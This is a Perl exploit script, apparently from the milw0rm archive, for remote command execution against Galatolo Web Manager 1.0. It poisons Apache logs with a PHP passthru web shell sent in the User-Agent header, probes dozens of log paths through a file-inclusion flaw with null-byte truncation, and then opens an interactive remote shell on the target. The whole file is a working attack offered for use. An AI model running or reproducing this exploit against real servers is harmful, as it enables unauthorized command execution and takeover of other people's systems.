#!/usr/bin/perl
# Galatolo Web Manager 1.0 Remote Command Execution Exploit
# by yeat - staker[at]hotmail[dot]it

use IO::Socket;
use LWP::UserAgent;

my ($lwp,$response) = new LWP::UserAgent;
my ($host,$path) = @ARGV;


if (@ARGV != 2) {
   print "Galatolo Web Manager 1.0 Remote Command Execution Exploit\n";
   print "by yeat - staker[at]hotmail[dot]it\n";
   print "Usage: perl $0 [host] [path]\n";
   exit;
}

inject_log();
shell_exec();



sub log_path
{
     my $path = undef;

     my @logs = (
          "../../../../../var/log/httpd/access_log",
          "../../../../../var/log/httpd/error_log",
          "../apache/logs/error.log",
          "../apache/logs/access.log",
          "../../apache/logs/error.log",
          "../../apache/logs/access.log",
          "../../../apache/logs/error.log",
          "../../../apache/logs/access.log",
          "../../../../apache/logs/error.log",
          "../../../../apache/logs/access.log",
          "../../../../../apache/logs/error.log",
          "../../../../../apache/logs/access.log",
          "../logs/error.log",
          "../logs/access.log",
          "../../logs/error.log",
          "../../logs/access.log",
          "../../../logs/error.log",
          "../../../logs/access.log",
          "../../../../logs/error.log",
          "../../../../logs/access.log",
          "../../../../../logs/error.log",
          "../../../../../logs/access.log",
          "../../../../../etc/httpd/logs/access_log",
          "../../../../../etc/httpd/logs/access.log",
          "../../../../../etc/httpd/logs/error_log",
          "../../../../../etc/httpd/logs/error.log",
          "../../.. /../../var/www/logs/access_log",
          "../../../../../var/www/logs/access.log",
          "../../../../../usr/local/apache/logs/access_log",
          "../../../../../usr/local/apache/logs/access.log",
          "../../../../../var/log/apache/access_log",
          "../../../../../var/log/apache/access.log",
          "../../../../../var/log/access_log",
          "../../../../../var/www/logs/error_log",
          "../../../../../var/www/logs/error.log",
          "../../../../../var/log/apache2/error.log",
          "../../../../../var/log/apache2/access.log",
          "../../../../../usr/local/apache/logs/error_log",
          "../../../../../usr/local/apache/logs/error.log",
          "../../../../../var/log/apache/error_log",
          "../../../../../var/log/apache/error.log",
          "../../../../../var/log/access_log",
          "../../../../../var/log/error_log"
     );

     $lwp->agent('Lynx (textmode)');

     for (my $i=0;$i<=$#logs;$i++) {
        $response = $lwp->get("http://$host/$path/index.php?cmd=echo '<yeatr0x>';&com=${logs[$i]}%00");;

        if ($response->content =~ m/<yeatr0x>/i) {
           $path = $logs[$i];
           break;
        }
    }      return $path;
}


sub shell_exec
{
     my $log = log_path();
     my $nos = "echo '<lulz>'";

     $lwp->agent('Lynx (textmode)');

      while (1) {
         print "\n[shell]~# ";
         chomp($cmd = <STDIN>);

         if ($cmd !~ /^(exit|exit--|--exit)$/i) {
            $response = $lwp->get("http://$host/$path/index.php?cmd=$nos;$cmd;$nos;&com=$log%00");

            if ($response->content =~ /<lulz>*/i) {
               @split = split('<lulz>',$response->content);
               print $split[1];
            }
        }
        else {
           die "Exited.";
        }
    }
}


sub inject_log
{
     my $header = undef;
     my $xploit = "lulz<?php passthru(stripslashes(\$_GET['cmd'])); exit; ?>";
     my $socket = new IO::Socket::INET (
                                         PeerAddr => $host,
                                         PeerPort => 80,
                                         Proto    => 'tcp',
                                      ) or die $!;

     $header .= "GET / HTTP/1.1\r\n";
     $header .= "Host: $host\r\n";
     $header .= "User-Agent: $xploit\r\n";
     $header .= "Connection: close\r\n\r\n";

     return $socket->send($header);
}

# milw0rm.com [2008-06-08]